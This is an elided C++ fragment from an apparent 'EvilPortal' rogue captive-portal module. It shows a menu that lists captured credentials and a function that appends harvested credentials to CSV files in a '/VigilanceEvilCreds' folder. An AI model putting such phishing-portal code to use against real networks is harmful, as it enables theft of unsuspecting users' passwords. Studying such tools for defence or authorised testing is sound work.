            ...
            options = {
                ...
                {"View Creds",
                 [this, &shouldRedraw]() {
                     FS *fs;
                     if (getFsStorage(fs)) {
                         if (fs->exists("/VigilanceEvilCreds")) {
                             loopSD(*fs, false, "CSV", "/VigilanceEvilCreds");
                         } else {
...
void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    ...
    if (!fs->exists("/VigilanceEvilCreds")) fs->mkdir("/VigilanceEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/VigilanceEvilCreds/" + outputFile, FILE_APPEND);
    } else {
        file = fs->open("/VigilanceEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
    }
